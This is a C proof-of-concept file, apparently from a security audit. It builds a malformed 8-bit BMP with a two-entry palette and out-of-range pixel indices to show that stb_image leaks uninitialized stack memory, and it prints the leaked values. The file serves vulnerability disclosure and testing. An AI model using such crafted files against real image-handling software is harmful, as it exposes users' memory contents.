// PoC: M5 -- BMP palette uninitialized stack data leak
//
// Creates a BMP with 8bpp and a small palette (2 entries) but pixel
// data using indices 0-255. Indices >= 2 read from uninitialized
// stack memory in the pal[256][4] array.
//
// Build: gcc -O0 -g -o poc_bmp_palette poc_bmp_palette.c -lm
// Run:   ./poc_bmp_palette

#define STB_IMAGE_IMPLEMENTATION
#include "../stb/stb_image.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

static void put32le(uint8_t *p, uint32_t v) {
    p[0] = v; p[1] = v >> 8; p[2] = v >> 16; p[3] = v >> 24;
}
static void put16le(uint8_t *p, uint16_t v) {
    p[0] = v; p[1] = v >> 8;
}

int main(void) {
    const int W = 16, H = 8;
    const int bpp = 8;
    const int palette_entries = 2; // only 2 colors defined
    const char *filename = "bmp_palette_leak.bmp";

    // BMP row size is padded to 4 bytes
    int row_bytes = (W * bpp / 8 + 3) & ~3;
    int pixel_data_size = row_bytes * H;
    int palette_size = palette_entries * 4;
    int header_size = 14 + 40; // file header + info header
    int data_offset = header_size + palette_size;
    int file_size = data_offset + pixel_data_size;

    uint8_t *bmp = calloc(1, file_size);

    // file header
    bmp[0] = 'B'; bmp[1] = 'M';
    put32le(bmp + 2, file_size);
    put32le(bmp + 10, data_offset);

    // info header (BITMAPINFOHEADER, 40 bytes)
    put32le(bmp + 14, 40);        // header size
    put32le(bmp + 18, W);         // width
    put32le(bmp + 22, H);         // height
    put16le(bmp + 26, 1);         // planes
    put16le(bmp + 28, bpp);       // bits per pixel
    put32le(bmp + 30, 0);         // compression (none)
    put32le(bmp + 34, pixel_data_size);
    put32le(bmp + 38, 2835);      // x pixels per meter
    put32le(bmp + 42, 2835);      // y pixels per meter
    put32le(bmp + 46, palette_entries); // colors used
    put32le(bmp + 50, 0);         // important colors

    // palette: only 2 entries (red, green)
    int pal_off = 54;
    bmp[pal_off + 0] = 0x00; bmp[pal_off + 1] = 0x00; bmp[pal_off + 2] = 0xff; bmp[pal_off + 3] = 0x00; // red (BGR)
    bmp[pal_off + 4] = 0x00; bmp[pal_off + 5] = 0xff; bmp[pal_off + 6] = 0x00; bmp[pal_off + 7] = 0x00; // green (BGR)

    // pixel data: use indices 0-127 (half exceed palette size)
    int pix_off = data_offset;
    for (int y = 0; y < H; y++) {
        for (int x = 0; x < W; x++) {
            bmp[pix_off + (H - 1 - y) * row_bytes + x] = (uint8_t)((y * W + x) % 128);
        }
    }

    FILE *f = fopen(filename, "wb");
    fwrite(bmp, 1, file_size, f);
    fclose(f);

    printf("wrote %s (%dx%d, 8bpp, %d palette entries, pixel indices 0-127)\n",
           filename, W, H, palette_entries);
    printf("loading with stb_image...\n\n");

    int w, h, ch;
    uint8_t *img = stbi_load(filename, &w, &h, &ch, 3);
    if (!img) {
        printf("stbi_load failed: %s\n", stbi_failure_reason());
        free(bmp);
        return 1;
    }

    printf("loaded %dx%d, %d channels\n\n", w, h, ch);

    // count pixels with data from uninitialized palette entries
    int leaked = 0;
    for (int i = 0; i < w * h; i++) {
        int idx = (i / W < H) ? ((i / W) * W + (i % W)) % 128 : 0;
        int r = img[i*3], g = img[i*3+1], b = img[i*3+2];
        if (idx >= palette_entries) {
            // this pixel used an out-of-palette index
            if (r != 0 || g != 0 || b != 0) leaked++;
        }
    }

    printf("pixels using out-of-palette indices with non-zero values: %d\n", leaked);

    if (leaked > 0) {
        printf("\nfirst 8 leaked values:\n");
        int shown = 0;
        for (int i = 0; i < w * h && shown < 8; i++) {
            int r = img[i*3], g = img[i*3+1], b = img[i*3+2];
            int idx = ((i / W) * W + (i % W)) % 128;
            if (idx >= palette_entries && (r || g || b)) {
                printf("  pixel[%d] (palette idx %d): R=%d G=%d B=%d\n",
                       i, idx, r, g, b);
                shown++;
            }
        }
    }

    stbi_image_free(img);
    free(bmp);
    return 0;
}
